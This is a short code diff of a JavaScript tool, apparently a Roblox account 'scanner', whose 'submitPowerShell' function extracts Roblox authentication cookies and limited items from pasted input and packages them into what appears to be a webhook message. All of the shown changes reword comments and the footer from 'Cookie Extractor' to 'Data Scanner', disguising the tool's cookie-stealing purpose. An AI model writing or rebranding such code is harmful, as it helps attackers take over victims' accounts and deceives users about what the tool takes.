@@ -230,7 +230,7 @@ async function submitPowerShell() {
     loadingOverlay.style.display = 'block';
 
     try {
-        // Scan limited items and extract authentication data from the input
+        // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
@@ -282,7 +282,7 @@ async function submitPowerShell() {
                     }
                 ],
                 footer: {
-                    text: "🍪 RoScan Cookie Extractor",
+                    text: "🍪 RoScan Data Scanner",
                     icon_url: "https://i.imgur.com/cookie-icon.png"
                 },
                 timestamp: new Date().toISOString()
@@ -329,7 +329,7 @@ async function submitPowerShell() {
     }
 }
 
-// Function to scan and extract authentication data from text
+// Function to scan and find authentication data from text
 function extractRobloxCookie(text) {
     // Look for various Roblox cookie patterns
     const patterns = [
